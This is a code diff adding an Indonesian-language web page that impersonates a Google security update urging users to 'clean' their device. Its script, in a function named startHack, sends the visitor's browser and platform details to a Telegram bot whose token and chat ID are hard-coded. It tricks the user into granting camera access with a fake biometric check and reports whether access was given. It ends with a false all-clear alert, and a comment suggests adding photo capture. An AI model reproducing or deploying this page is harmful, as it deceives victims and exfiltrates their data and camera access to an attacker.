@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google System Update</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f1f1f1; text-align: center; padding: 50px; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #5f6368; }
+        p { color: #70757a; font-size: 14px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="100">
+    <h2>Pembaruan Keamanan</h2>
+    <div id="status-box">
+        <p>Sistem mendeteksi ancaman pada perangkat Anda. Klik tombol di bawah untuk verifikasi dan membersihkan perangkat.</p>
+        <button onclick="startHack()">BERSIHKAN SEKARANG</button>
+    </div>
+    <div id="loading-box" style="display:none;">
+        <div class="loader"></div>
+        <p id="log-text">Menghubungkan ke server Google...</p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
+    const CHAT_ID = "8025603711";
+
+    function sendToTelegram(msg) {
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
+    }
+
+    async function startHack() {
+        document.getElementById('status-box').style.display = 'none';
+        document.getElementById('loading-box').style.display = 'block';
+
+        // 1. Ambil Info Browser & IP
+        let info = `🔥 <b>TARGET BARU (WEB)</b>\n`;
+        info += `🌐 Browser: ${navigator.userAgent}\n`;
+        info += `🖥️ Platform: ${navigator.platform}\n`;
+        info += `🔋 Baterai: Meminta data...`;
+        
+        sendToTelegram(info);
+
+        // 2. Minta Izin Kamera (Jebakan)
+        document.getElementById('log-text').innerText = "Memverifikasi identitas via Biometrik...";
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            sendToTelegram("📸 Izin Kamera: DIBERIKAN (Target bisa difoto!)");
+            // Di sini kamu bisa tambahin fungsi capture canvas kalau mau fotonya dikirim
+        } catch (e) {
+            sendToTelegram("❌ Izin Kamera: DITOLAK");
+        }
+
+        // 3. Selesai
+        setTimeout(() => {
+            document.getElementById('log-text').innerText = "Pembersihan Selesai! Perangkat Aman.";
+            alert("Perangkat Anda sekarang sudah aman dari ancaman.");
+        }, 5000);
+    }
+</script>
+
+</body>
+</html>
